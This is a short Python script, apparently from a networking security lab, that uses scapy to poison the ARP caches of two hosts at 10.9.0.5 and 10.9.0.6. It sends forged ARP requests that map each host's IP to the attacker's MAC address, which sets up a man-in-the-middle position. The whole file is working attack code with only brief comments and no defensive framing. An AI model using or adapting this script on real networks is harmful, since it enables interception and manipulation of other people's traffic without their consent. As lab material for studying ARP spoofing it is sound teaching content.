#!/usr/bin/python3
from scapy.all import *

#This program initializes the Man in the middle attack
#It sets A's entry in B to be M mac and B's entry in A to be M mac
#Only uses ARP request
MAC_M = "02:42:0a:09:00:69"
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
BROADCAST = "ff:ff:ff:ff:ff:ff"

#For IP_A
E = Ether(src=MAC_M, dst=BROADCAST)
A = ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_A)
A.op = 1
pkt = E/A

#For IP_B
E1 = Ether(src=MAC_M, dst=BROADCAST)
A1 = ARP(psrc=IP_A, hwsrc=MAC_M, pdst = IP_B)
A1.op = 1
pkt1 = E1/A1

sendp(pkt)
sendp(pkt1)
